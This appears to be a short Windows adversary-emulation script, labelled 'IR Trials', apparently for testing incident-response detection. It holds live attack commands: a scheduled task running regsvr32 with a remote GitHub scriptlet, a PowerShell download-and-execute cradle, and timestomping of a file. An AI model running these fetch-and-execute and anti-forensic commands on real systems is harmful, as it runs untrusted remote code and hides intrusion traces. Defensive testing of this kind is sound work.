SCHTASKS /Create /SC MINUTE /TN "IR Trials" /TR "regsvr32.exe /s /u /i:https://raw.githubusercontent.com/caabv/Scripts/master/RegSvr32.sct scrobj.dll" /mo 5
SCHTASKS /Run /TN "IR Trials"
SCHTASKS /Delete /TN "IR Trials" /F
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/caabv/ISA-Project/master/ISA.ps1'); Invoke-ISA -Groups 'Users,Everyone,Authenticated Users' -Mode full -Extended"
$test = "IR Trials File"
set-content -path test.txt -value $test
$file=(gi test.txt);$date='7/16/1945 5:29 am';$file.LastWriteTime=$date;$file.LastAccessTime=$date;$file.CreationTime=$date
del test.txt
